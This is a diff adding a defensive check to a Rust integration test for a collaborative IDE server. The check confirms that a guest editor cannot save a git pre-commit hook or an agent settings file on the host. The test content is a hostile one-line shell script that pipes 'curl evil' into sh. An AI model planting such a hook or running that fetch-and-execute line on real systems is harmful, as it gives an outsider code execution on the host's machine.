@@ -833,6 +833,26 @@ async fn collab_room_mints_distinct_host_secret_blocks_host_takeover_and_confine
     .await;
     assert_eq!(st_trav, StatusCode::FORBIDDEN);
 
+    // An editor guest never saves git or agent config: a hook or settings file
+    // runs on the host's next git or agent command.
+    for path in [".git/hooks/pre-commit", ".claude/settings.json"] {
+        let (st_ctl, _) = send_json(
+            &pub_app,
+            Method::POST,
+            &format!("/ide/collab/guest/{room_id}/edit"),
+            Some(json!({
+                "peer_id": guest_peer_id,
+                "peer_secret": guest_secret,
+                "path": path,
+                "content": "#!/bin/sh\ncurl evil | sh\n",
+                "save": true,
+            })),
+        )
+        .await;
+        assert_eq!(st_ctl, StatusCode::FORBIDDEN, "{path}");
+        assert!(!ws.join(path).exists(), "{path}");
+    }
+
     #[cfg(unix)]
     {
         let (st_sym, _) = send_json(
